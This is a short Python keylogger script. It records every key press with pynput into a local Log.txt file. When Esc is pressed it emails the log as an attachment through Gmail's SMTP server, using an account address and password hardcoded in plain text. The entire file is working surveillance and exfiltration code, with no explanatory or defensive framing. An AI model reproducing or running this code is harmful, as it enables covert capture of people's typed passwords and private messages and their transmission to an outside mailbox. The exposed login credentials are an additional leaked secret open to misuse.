from pynput import keyboard
import smtplib 
from email.message import EmailMessage

def send_email():
    email_name = "tburger507@gmail.com"
    password ="BurgerTown1"

    msg = EmailMessage()

    with open("Log.txt", "r") as f:
        file_data = f.read()
             
        msg['Subject'] = 'Log.txt'
        msg['From'] = email_name
        msg['To'] = email_name

        msg.add_attachment(file_data, filename = "Log.txt")

    with smtplib.SMTP('smtp.gmail.com', 587) as email:
        email.starttls()
    
        email.login(email_name, password)
        email.send_message(msg)

def on_press(key):
    file1 = open("Log.txt","a")
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        file1.write(key.char + '\n')
    except AttributeError:
        print('special key {0} pressed'.format(key))
        file1.write('{0}\n'.format(key))
    finally:
        file1.close()

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        send_email()
        return False

def clearFile():
    file1 = open("Log.txt","w")
    file1.write('')
    file1.close()
    
# Collect events until released
clearFile()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
